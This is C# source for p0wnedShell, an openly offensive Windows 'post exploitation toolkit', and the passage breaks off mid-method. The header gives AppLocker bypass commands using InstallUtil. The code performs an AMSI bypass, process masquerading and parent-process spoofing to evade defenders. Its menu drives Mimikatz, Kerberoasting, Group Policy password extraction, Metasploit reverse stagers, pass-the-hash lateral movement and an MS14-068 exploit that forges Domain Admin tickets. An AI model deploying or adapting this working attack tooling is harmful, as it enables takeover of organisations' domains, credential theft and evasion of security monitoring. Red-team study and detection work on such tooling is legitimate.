/*******************************************************************\
*            ____                          _______ __         ____  *
*     ____  / __ \_      ______  ___  ____/ / ___// /_  ___  / / /  *
*    / __ \/ / / / | /| / / __ \/ _ \/ __  /\__ \/ __ \/ _ \/ / /   *
*   / /_/ / /_/ /| |/ |/ / / / /  __/ /_/ /___/ / / / /  __/ / /    *
*  / .___/\____/ |__/|__/_/ /_/\___/\__,_//____/_/ /_/\___/_/_/     *
* /_/                                                               *
*                                    By Cn33liz and Skons 2018      *
*                                                                   *
* PowerShell Runspace Post Exploitation Toolkit                     *
* A RedTeam Swiss Army Knife for Windows Based Systems              *
*                                                                   *
*                                                            v2.6   *
\*******************************************************************/

/*
License: BSD 3-Clause

To compile p0wnedShell you need to open this project within Microsoft Visual Studio and build it for the x64/x86 platform.
You can change the AutoMasq option before compiling (set AutoMasq to true/false and/or change the process name to masquerade)

How to use it:

With AutoMasq set to false, you just run the executable so it runs normally.
With AutoMasq enabled, you could rename the p0wnedShell executable as the process you are going to masquerade so it has the appearance of that process (for example notepad.exe).

Using the optional "-parent" commandline argument, you can start p0wnedShell using another Parent Process ID.
When combining the PEB Masq option and different parent process ID (for example svchost), you can give p0wnedShell the appearance of a legitimate service ;) 

Note: Running p0wnedShell using another Parent Process ID doesn't work from a Meterpreter session/shell.... yet!

To run as x86 binary and bypass Applocker (Credits for this great bypass go to Casey Smith aka subTee):
cd \Windows\Microsoft.NET\Framework\v4.0.30319
InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedShell\p0wnedShellx86.exe

To run as x64 binary and bypass Applocker:
cd \Windows\Microsoft.NET\Framework64\v4.0.30319
InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedShell\p0wnedShellx64.exe
*/

using System;
using System.IO;
using System.Net;
using System.Text;
using System.Globalization;
using System.Reflection;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.DirectoryServices.ActiveDirectory;


namespace p0wnedShell
{
    public static class p0wnedShellOpsec
    {
        public static bool AutoMasq = false;
        public static string masqBinary = @"C:\Windows\notepad.exe";
        //public static string masqBinary = Environment.SystemDirectory + @\wbem\WmiPrvSE.exe";
        //public static string masqBinary = Environment.SystemDirectory + @"\WindowsPowerShell\v1.0\powershell.exe";
    }

    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtil : System.Configuration.Install.Installer
    {
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Install(System.Collections.IDictionary savedState)
        {
            //Place Something Here... For Confusion/Distraction			
        }

        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Program.Entry();
        }
    }

    public static class ConsoleEx
    {
        public enum FileType { Unknown, Disk, Char, Pipe };
        public enum StdHandle { Stdin = -10, Stdout = -11, Stderr = -12 };

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern FileType GetFileType(IntPtr handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetStdHandle(StdHandle std);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetStdHandle(StdHandle std, IntPtr handle);

        public static bool IsOutputRedirected
        {
            get { return FileType.Char != GetFileType(GetStdHandle(StdHandle.Stdout)); }
        }
        public static bool IsInputRedirected
        {
            get { return FileType.Char != GetFileType(GetStdHandle(StdHandle.Stdin)); }
        }
        public static bool IsErrorRedirected
        {
            get { return FileType.Char != GetFileType(GetStdHandle(StdHandle.Stderr)); }
        }
    }

    class Program
    {
        public static void PrintBanner(string[] toPrint = null)
        {
            if (!ConsoleEx.IsInputRedirected || !ConsoleEx.IsOutputRedirected || !ConsoleEx.IsErrorRedirected)
            {
                Console.Clear();
            }
            Console.BackgroundColor = ConsoleColor.DarkBlue;
            Console.WriteLine(@"*********************************************************************");
            Console.WriteLine(@"*            ____                          _______ __         ____  *");
            Console.WriteLine(@"*     ____  / __ \_      ______  ___  ____/ / ___// /_  ___  / / /  *");
            Console.WriteLine(@"*    / __ \/ / / / | /| / / __ \/ _ \/ __  /\__ \/ __ \/ _ \/ / /   *");
            Console.WriteLine(@"*   / /_/ / /_/ /| |/ |/ / / / /  __/ /_/ /___/ / / / /  __/ / /    *");
            Console.WriteLine(@"*  / .___/\____/ |__/|__/_/ /_/\___/\__,_//____/_/ /_/\___/_/_/     *");
            Console.WriteLine(@"* /_/                                                               *");
            Console.WriteLine(@"*                                    /By Cn33liz and Skons 2018\    *");
            Console.WriteLine(@"*                                       \Cornelis@dePlaa.com/       *");
            Console.WriteLine(@"*                                                                   *");
            if (toPrint != null)
            {
                foreach (string item in toPrint)
                {
                    Console.WriteLine(item);
                }
            }

            string procArch = "x86";
            if (Pshell.EnvironmentHelper.Is64BitProcess())
            {
                procArch = "x64";
            }

            Console.WriteLine(@"*                                                        v2.6  " + procArch + "  *");
            Console.WriteLine(@"*********************************************************************");
            Console.ResetColor();
            Console.WriteLine();
        }

        public static bool IsElevated
        {
            get
            {
                return WindowsIdentity.GetCurrent().Owner
                  .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
            }
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern int GetShortPathName(
            [MarshalAs(UnmanagedType.LPTStr)]
            string path,
            [MarshalAs(UnmanagedType.LPTStr)]
            StringBuilder shortPath,
            int shortPathLength
            );

        public static string P0wnedPath()
        {
            string BinaryPath = Assembly.GetExecutingAssembly().CodeBase;
            BinaryPath = BinaryPath.Replace("file:///", string.Empty).Replace("/", @"\");
            BinaryPath = BinaryPath.Remove(BinaryPath.LastIndexOf(@"\"));

            StringBuilder shortPath = new StringBuilder(255);
            GetShortPathName(BinaryPath, shortPath, shortPath.Capacity);
            return (shortPath.ToString());
        }

        public static string DetectProxy()
        {
            string url = "http://www.google.com/";
            // Create a new request to the mentioned URL.				
            HttpWebRequest myWebRequest = (HttpWebRequest)WebRequest.Create(url);

            // Obtain the 'Proxy' of the  Default browser.  
            IWebProxy proxy = myWebRequest.Proxy;
            // Print the Proxy Url to the console.

            string ProxyURL = proxy.GetProxy(myWebRequest.RequestUri).ToString();

            if (ProxyURL != url)
            {
                return ProxyURL.TrimEnd('/');
            }
            else
            {
                return null;
            }
        }


        public static string ReadPassword()
        {
            string password = "";
            ConsoleKeyInfo info = Console.ReadKey(true);
            while (info.Key != ConsoleKey.Enter)
            {
                if (info.Key != ConsoleKey.Backspace)
                {
                    Console.Write("*");
                    password += info.KeyChar;
                }
                else if (info.Key == ConsoleKey.Backspace)
                {
                    if (!string.IsNullOrEmpty(password))
                    {
                        // remove one character from the list of password characters
                        password = password.Substring(0, password.Length - 1);
                        // get the location of the cursor
                        int pos = Console.CursorLeft;
                        // move the cursor to the left by one character
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                        // replace it with space
                        Console.Write(" ");
                        // move the cursor to the left by one character again
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                    }
                }
                info = Console.ReadKey(true);
            }
            // add a new line because user pressed enter at the end of their password
            Console.WriteLine();
            return password;
        }


        public static int DisplayMenu()
        {
            string[] toPrint = { "* PowerShell Runspace Post Exploitation Toolkit                     *",
                                 "* A RedTeam Swiss Army Knife for Windows Based Systems              *" };
            Program.PrintBanner(toPrint);
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[*] Information Gathering:\n");
            Console.ResetColor();
            Console.WriteLine(" 1. Use PowerView to gain network situational awareness on Windows Domains.");
            Console.WriteLine(" 2. Use Invoke-UserHunter and/or BloodHound to identify AD Attack Paths.");
            Console.WriteLine(" 3. Scan for IP-Addresses, HostNames and open Ports in your Network.");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[*] Code Execution:\n");
            Console.ResetColor();
            Console.WriteLine(" 4. Reflectively load Mimikatz or ReactOS into Memory, bypassing AV/AppLocker.");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[*] Privilege Escalation:\n");
            Console.ResetColor();
            Console.WriteLine(" 5. Use PowerUp tool to assist with local Privilege Escalation on Windows Systems.");
            Console.WriteLine(" 6. Get a SYSTEM shell using EasySystem or Token Manipulation.");
            Console.WriteLine(" 7. Inveigh a PowerShell based LLMNR/mDNS/NBNS Spoofer/Man-In-The-Middle tool.");
            Console.WriteLine(" 8. Exploiting Group Policy Preference settings");
            Console.WriteLine(" 9. Use Invoke-Kerberoast to get Crackable AD Service Account Hashes.");
            Console.WriteLine(" 10. Attacking Active Directory using Mimikatz.");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[*] Exploitation:\n");
            Console.ResetColor();
            Console.WriteLine(" 11. Get SYSTEM Privileges using various Exploits/Vulnerabilities.");
            Console.WriteLine(" 12. Own AD in 60 seconds using the MS14-068 Kerberos Vulnerability.");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[*] Command & Control and Lateral Movement:\n");
            Console.ResetColor();
            Console.WriteLine(" 13. Execute Metasploit reversed https Stager or Inject as Shellcode.");
            Console.WriteLine(" 14. Use WinRM, PsExec or SMB/WMI (PtH) to execute commands on remote systems.");
            Console.WriteLine(" 15. PowerCat our PowerShell TCP/IP Swiss Army Knife.");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[*] Others:\n");
            Console.ResetColor();
            Console.WriteLine(" 16. Execute (Offensive) PowerShell Scripts and Commands.");
            Console.WriteLine();
            Console.WriteLine(" 17. Exit");
            Console.Write("\nEnter choice: ");
            var result = Console.ReadLine();

            try
            {
                return Convert.ToInt32(result);
            }
            catch
            {
                return 0;
            }
        }

        public static void Main(string[] args)
        {
            // Get Assembly Path 
            string BinaryPath = Assembly.GetExecutingAssembly().CodeBase;
            string lpApplicationName = BinaryPath.Replace("file:///", string.Empty).Replace("/", @"\");

            if (args.Length == 1 && args[0].ToLower() == "-parent")
            {
                Console.WriteLine("\n [+] Please enter a valid Parent Process name.");
                Console.WriteLine(" [+] For Example: {0} -parent svchost", lpApplicationName);
                return;
            }
            else if (args.Length == 2)
            {
                if (args[0].ToLower() == "-parent" && args[1] != null)
                {
                    string PPIDName = args[1];
                    int NewPPID = 0;

                    // Find PID from our new Parent and start new Process with new Parent ID
                    NewPPID = ProcessCreator.NewParentPID(PPIDName);
                    if (NewPPID == 0)
                    {
                        Console.WriteLine("\n [!] No suitable Process ID Found...");
                        return;
                    }

                    if (!ProcessCreator.CreateProcess(NewPPID, lpApplicationName, null))
                    {
                        Console.WriteLine("\n [!] Oops PPID Spoof failed...");
                        return;
                    }
                }
            }
            else
            {
                Entry();
            }

            return;
        }


        public static void Entry()
        {
            string Arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            string LatestOSVersion = "6.3";
            decimal latestOSVersionDec = decimal.Parse(LatestOSVersion, CultureInfo.InvariantCulture);
            if (Pshell.EnvironmentHelper.RtlGetVersion() > latestOSVersionDec)
            {
                string MasqPath = p0wnedShellOpsec.masqBinary.Remove(p0wnedShellOpsec.masqBinary.LastIndexOf(@"\")).ToLower();
                string SystemPath = Environment.SystemDirectory.ToLower();

                AmsiBypass.Amsi(Arch);
                if (p0wnedShellOpsec.AutoMasq && MasqPath == SystemPath)
                {
                    // Starting Runspace before we Masquerade our Process
                    Pshell.P0wnedListener.Execute("Write-Host '[+] AMSI Bypassed'");
                }
            }

            if (p0wnedShellOpsec.AutoMasq || ConsoleEx.IsInputRedirected || ConsoleEx.IsOutputRedirected)
            {
                Console.WriteLine("[+] Auto Masquerade our Process to: {0}", p0wnedShellOpsec.masqBinary);
                if (!PEBMasq.MasqueradePEB(p0wnedShellOpsec.masqBinary))
                {
                    Console.WriteLine("[!] Auto Masquerade Failed :(");
                }
            }

            if (!p0wnedShellOpsec.AutoMasq)
            {
                Console.Title = "p0wnedShell - PowerShell Runspace Post Exploitation Toolkit";
            }

            if (!ConsoleEx.IsInputRedirected || !ConsoleEx.IsOutputRedirected || !ConsoleEx.IsErrorRedirected)
            {
                Console.SetWindowSize(Math.Min(120, Console.LargestWindowWidth), Math.Min(55, Console.LargestWindowHeight));
            }

            int userInput = 0;

            do
            {
                userInput = DisplayMenu();
                switch (userInput)
                {
                    case 1:
                        Pshell.PowerView();
                        break;
                    case 2:
                        SitAwareness.Menu();
                        break;
                    case 3:
                        Pshell.PortScan();
                        break;
                    case 4:
                        Execution.Menu();
                        break;
                    case 5:
                        Pshell.PowerUp();
                        break;
                    case 6:
                        GetSystem.Menu();
                        break;
                    case 7:
                        Inveigh.Menu();
                        break;
                    case 8:
                        Pshell.GetGPPPassword();
                        break;
                    case 9:
                        Roast.Menu();
                        break;
                    case 10:
                        ADAttacks.Menu();
                        break;
                    case 11:
                        Exploits.Menu();
                        break;
                    case 12:
                        if (Arch == "x86")
                        {
                            Pshell.MS14_068();
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx86\n");
                            Console.ResetColor();
                            Console.WriteLine("Press Enter to Continue...");
                            Console.ReadLine();
                        }
                        break;
                    case 13:
                        p0wnedMeter.Menu();
                        break;
                    case 14:
                        LatMovement.Menu();
                        break;
                    case 15:
                        PowerCat.Menu();
                        break;
                    case 16:
                        Pshell.InvokeShell();
                        break;
                    default:
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\nSee you later Alligator ;)");
                        Console.ResetColor();
                        break;
                }

            } while (userInput != 17);

            string TempFolder = Path.GetTempPath();
            if (File.Exists(TempFolder + "\\Amsi.dll"))
            {
                File.Delete(TempFolder + "\\Amsi.dll");
            }
        }
    }

    public class Pshell
    {

        public static class EnvironmentHelper
        {
            [DllImport("kernel32.dll")]
            static extern IntPtr GetCurrentProcess();

            [DllImport("kernel32.dll")]
            static extern IntPtr GetModuleHandle(string moduleName);

            [DllImport("kernel32")]
            static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32.dll")]
            static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);

            public static bool Is64BitOperatingSystem()
            {
                // Check if this process is natively an x64 process. If it is, it will only run on x64 environments, thus, the environment must be x64.
                if (Is64BitProcess())
                    return true;
                // Check if this process is an x86 process running on an x64 environment.
                IntPtr moduleHandle = GetModuleHandle("kernel32");
                if (moduleHandle != IntPtr.Zero)
                {
                    IntPtr processAddress = GetProcAddress(moduleHandle, "IsWow64Process");
                    if (processAddress != IntPtr.Zero)
                    {
                        bool result;
                        if (IsWow64Process(GetCurrentProcess(), out result) && result)
                            return true;
                    }
                }
                // The environment must be an x86 environment.
                return false;
            }

            public static bool Is64BitProcess()
            {
                return IntPtr.Size == 8;
            }

            [DllImport("ntdll.dll")]
            private static extern int RtlGetVersion(out RTL_OSVERSIONINFOEX lpVersionInformation);

            [StructLayout(LayoutKind.Sequential)]
            internal struct RTL_OSVERSIONINFOEX
            {
                internal uint dwOSVersionInfoSize;
                internal uint dwMajorVersion;
                internal uint dwMinorVersion;
                internal uint dwBuildNumber;
                internal uint dwPlatformId;
                [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
                internal string szCSDVersion;
            }

            public static decimal RtlGetVersion()
            {
                RTL_OSVERSIONINFOEX osvi = new RTL_OSVERSIONINFOEX();
                osvi.dwOSVersionInfoSize = (uint)Marshal.SizeOf(osvi);
                //const string version = "Microsoft Windows";
                if (RtlGetVersion(out osvi) == 0)
                {
                    string Version = osvi.dwMajorVersion + "." + osvi.dwMinorVersion;
                    return decimal.Parse(Version, CultureInfo.InvariantCulture);
                }
                else
                {
                    return -1;
                }
            }
        }

        public static P0wnedListenerConsole P0wnedListener = new P0wnedListenerConsole();

        public static void InvokeShell()
        {
            string[] toPrint = { "* Type exit or quit to Exit                                         *" };
            Program.PrintBanner(toPrint);
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("[+] For remote fun use Enter-PSSession hostname (requires Powershell remoting and permissions to log in) \n");
            Console.Write("[+] You can use Get-Credential in case you already have valid admin credentials\n\n");
            Console.Write("[+] The following Post Exploitation modules are loaded:\n\n");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[+] PowerSploit: Invoke-Shellcode\n");
            Console.Write("[+] PowerSploit: Invoke-ReflectivePEInjection\n");
            Console.Write("[+] PowerSploit: Invoke-Mimikatz\n");
            Console.Write("[+] PowerSploit: Invoke-TokenManipulation\n");
            Console.Write("[+] PowerSploit: PowerUp and PowerView\n");
            Console.Write("[+] Rasta Mouse: Sherlock (Find-AllVulns)\n");
            Console.Write("[+] HarmJ0y's: Invoke-Psexec and Invoke-Kerberoast\n");
            Console.Write("[+] Rohan Vazarkar's: Invoke-BloodHound (C# Ingestor)\n");
            Console.Write("[+] Chris Campbell's: Get-GPPPassword\n");
            Console.Write("[+] Tim Medin's: GetUserSPNS\n");
            Console.Write("[+] Besimorhino's: PowerCat\n");
            Console.Write("[+] Nishang: Copy-VSS and Invoke-Encode\n");
            Console.Write("[+] Nishang: Invoke-PortScan and Get-PassHashes\n");
            Console.Write("[+] Kevin Robertson: Invoke-Tater, Invoke-SMBExec and Invoke-WMIExec\n");
            Console.Write("[+] Kevin Robertson: Invoke-Inveigh and Invoke-InveighRelay\n");
            Console.Write("[+] FuzzySecurity: Invoke-MS16-032 and Invoke-MS16-135\n\n");
            Console.Write("[+] Use Get-Help <ModuleName> for syntax usage and Have Fun :)\n\n");
            Console.Write("[+] Type mimikatz to reflective load Mimikatz from memory or easysystem to get a system shell\n\n");
            Console.ResetColor();

            P0wnedListener.CommandShell();
        }

        public static void MS14_068()
        {
            string[] toPrint = { "* Own AD in 60 seconds using the MS14-068 Kerberos Vulnerability    *" };
            Program.PrintBanner(toPrint);

            string DomainJoined = String.Empty;
            try
            {
                DomainJoined = Domain.GetComputerDomain().Name;
            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Looks like our machine is not joined to a Windows Domain.\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }

            Domain domain = Domain.GetCurrentDomain();
            DomainController Current_DC = domain.PdcRoleOwner;
            string DomainName = domain.ToString();

            Console.WriteLine("[+] First return the name of our current domain.\n");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(DomainName);
            Console.ResetColor();

            Console.WriteLine("\n[+] For this attack to succeed, we need a valid AD user account and password.");
            Console.Write("[+] Do you have a valid user account and password? (y/n) > ");
            string User = null;
            string Password = null;
            string input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    Console.Write("\n[+] Please enter a username > ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    User = Console.ReadLine();
                    Console.ResetColor();
                    if (User.Length < 2)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] This is not a valid user account, please try again\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                        return;
                    }
                    Console.Write("\n[+] Please enter a password > ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Password = Program.ReadPassword();
                    Console.ResetColor();
                    if (Password.Length < 2)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] This is not a valid password, please try again\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                        return;
                    }
                    break;
                case "n":
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] First try to get a username and password.\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
            }

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\n[+] Now wait while re-writing our user ticket to be a Domain Admin ticket (forged PAC)...\n");
            Console.ResetColor();

            string MS14_068 = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.MS14_068() + "\" -split ' ') -ExeArgs \"/domain:" + DomainName + " /user:" + User + " /password:" + Password + " /ptt\"";
            try
            {
                P0wnedListener.Execute(MS14_068);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            string DC_Listing = "Get-ChildItem \\\\" + Current_DC + "\\C$";
            string SuperPower = null;
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\n[+] let's check if our exploit succeeded:\n");
            Console.ResetColor();
            try
            {
                SuperPower = RunPSCommand(DC_Listing);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            if (SuperPower.Length <= 5)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Exploit failed, Wrong Username/Password combination or the Domain Controllers are already patched!\n");
                Console.ResetColor();
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\n[+] OwYeah, " + User + " you are in Full Control of the Domain :)\n");
                Console.ResetColor();
                Console.WriteLine(RunPSCommand(DC_Listing));
            }
            Console.WriteLine("Press Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void PowerUp()
        {
            string[] toPrint = { "* Use PowerUp to assist with local privilege escalation.            *" };
            Program.PrintBanner(toPrint);

            Console.Write("[+] Please wait while running all checks...\n");

            string PowerUp_AllChecks = "Invoke-AllChecks";
            try
            {
                Console.WriteLine(RunPSCommand(PowerUp_AllChecks));
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[+] Check above recommendations to assist with local privilege escalation.\n");
            Console.ResetColor();
            P0wnedListener.CommandShell();
            return;
        }

        
        public static void PowerView()
        {
            string[] toPrint = { "* Gain network situational awareness on Windows Domains.            *" };
            Program.PrintBanner(toPrint);

            string DomainJoined = String.Empty;
            try
            {
                DomainJoined = Domain.GetComputerDomain().Name;
            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Looks like our machine is not joined to a Windows Domain.\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }

            string NetForest = "Get-NetForest";
            string NetForestDomain = "Get-NetForestDomain";
            string NetForestTrust = "Get-NetForestTrust";
            string NetDomain = "Get-NetDomain";
            string DomainSID = "Get-DomainSID";
            string NetDomainTrust = "Get-NetDomainTrust";
            string MapDomainTrust = "Invoke-MapDomainTrust -LDAP";
            string NetGroupMember = "Get-NetGroupMember";
            try
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[+] Getting the forest associated with the current user's domain.\n");
                Console.ResetColor();
                Console.WriteLine(RunPSCommand(NetForest));
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Getting all domains for the current forest.\n");
                Console.ResetColor();
                Console.WriteLine(RunPSCommand(NetForestDomain));
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Getting all trusts for the forest associated with the current user's domain.\n");
                Console.ResetColor();
                Console.WriteLine(RunPSCommand(NetForestTrust));
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Getting the name of the current user's domain.\n");
                Console.ResetColor();
                Console.WriteLine(RunPSCommand(NetDomain));
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Get a list of all Members in the Domain Admin group.\n");
                Console.ResetColor();
                Console.WriteLine(RunPSCommand(NetGroupMember));
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[+] Return the SID for the specified domain.\n");
                Console.ResetColor();
                Console.WriteLine(RunPSCommand(DomainSID));
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[+] Getting all trusts for the current user's domain.\n");
                Console.ResetColor();
                Console.WriteLine(RunPSCommand(NetDomainTrust));
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[+] Let's try to build a relational mapping of all Domain trusts.\n");
                Console.ResetColor();
                Console.WriteLine(RunPSCommand(MapDomainTrust));
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            return;
        }

        public static void PortScan()
        {
            string[] toPrint = { "* Scan for IP-Addresses, HostNames and open Ports in your Network.  *" };
            Program.PrintBanner(toPrint);

            IPAddress Start = IPAddress.Parse("1.1.1.1");
            IPAddress End = IPAddress.Parse("1.1.1.1");
            string Ports = "";

            while (true)
            {
                try
                {
                    Console.Write("Enter start ip address to scan from (e.g. 192.168.1.1): ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Start = IPAddress.Parse(Console.ReadLine());
                    Console.ResetColor();
                    Console.WriteLine();
                    break;
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] That's not a valid IP address, Please Try again\n");
                    Console.ResetColor();
                }
            }

            while (true)
            {
                try
                {
                    Console.Write("Enter end ip address to scan to (e.g. 192.168.1.253): ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    End = IPAddress.Parse(Console.ReadLine());
                    Console.ResetColor();
                    Console.WriteLine();
                    break;
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] That's not a valid IP address, Please Try again\n");
                    Console.ResetColor();
                }
            }

            int Failed;
            do
            {
                Failed = 0;
                Console.Write("Now Enter the port or port range to scan (e.g. 445 or 80,445,5985): ");
                Console.ForegroundColor = ConsoleColor.Green;
                Ports = Console.ReadLine();
                Console.ResetColor();

                foreach (string value in Ports.Split(','))
                {
                    try
                    {
                        int.Parse(value);
                        if (Int32.Parse(value) < 1 || Int32.Parse(value) > 65535)
                        {
                            Failed += 1;
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("\n[+] That's not a valid Port, Please Try again\n");
                            Console.ResetColor();
                        }
                    }
                    catch
                    {
                        Failed += 1;
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] That's not a valid Port, Please Try again\n");
                        Console.ResetColor();
                    }
                }
            }
            while (Failed != 0);

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\n[+] Please wait while running our scan...\n");
            Console.ResetColor();

            string PortScan = "Invoke-PortScan -StartAddress " + Start + " -EndAddress " + End + " -ResolveHost -ScanPort -Port " + Ports + " | ft -autosize";
            try
            {
                P0wnedListener.Execute(PortScan);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            Console.WriteLine("Press Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void GetGPPPassword()
        {
            string[] toPrint = { "* Exploiting Group Policy Preference settings                       *" };
            Program.PrintBanner(toPrint);

            string DomainJoined = String.Empty;
            try
            {
                DomainJoined = Domain.GetComputerDomain().Name;
            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Looks like our machine is not joined to a Windows Domain.\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }

            Console.Write("[+] Please wait while enumerating Group Policy Preference settings...\n");

            string GPPPassword = "Get-GPPPassword | more";
            try
            {
                P0wnedListener.Execute(GPPPassword);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            Console.WriteLine("\nPress Enter to Continue...");
            Console.ReadLine();
            return;
        }

        //Based on Jared Atkinson's And Justin Warner's Work
        public static string RunPSCommand(string cmd)
        {
            //Init stuff
            InitialSessionState initial = InitialSessionState.CreateDefault();
            // Replace PSAuthorizationManager with a null manager which ignores execution policy
            initial.AuthorizationManager = new System.Management.Automation.AuthorizationManager("MyShellId");

            Runspace runspace = RunspaceFactory.CreateRunspace(initial);
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();

            //Add commands
            if (cmd.IndexOf("Invoke-Shellcode", 0, StringComparison.OrdinalIgnoreCase) != -1)
            {
                pipeline.Commands.AddScript(Resources.Invoke_Shellcode());
            }
            if (cmd.IndexOf("Invoke-Mimikatz", 0, StringComparison.OrdinalIgnoreCase) != -1)
            {
                pipeline.Commands.AddScript(Resources.Invoke_Mimikatz());
            }
            if (cmd.IndexOf("Invoke-ReflectivePEInjection", 0, StringComparison.OrdinalIgnoreCase) != -1)
            {
                pipeline.Commands.AddScript(Resources.Invoke_ReflectivePEInjection());
            }
            if (cmd.IndexOf("Invoke-PsExec", 0, StringComparison.OrdinalIgnoreCase) != -1)
            {
                pipeline.Commands.AddScript(Resources.Invoke_PsExec());
            }
            if (cmd.IndexOf("Invoke-TokenManipulation", 0, StringComparison.OrdinalIgnoreCase) != -1)
            {
                pipeline.Commands.AddScript(Resources.Invoke_TokenManipulation());
            }
            if (cmd.IndexOf("PowerCat", 0, StringComparison.OrdinalIgnoreCase) != -1)
            {
                pipeline.Commands.AddScript(Resources.PowerCat());
            }
            if (cmd.IndexOf("Invoke-Encode", 0, StringComparison.OrdinalIgnoreCase) != -1)
            {
                pipeline.Commands.AddScript(Resources.Invoke_Encode());
            }

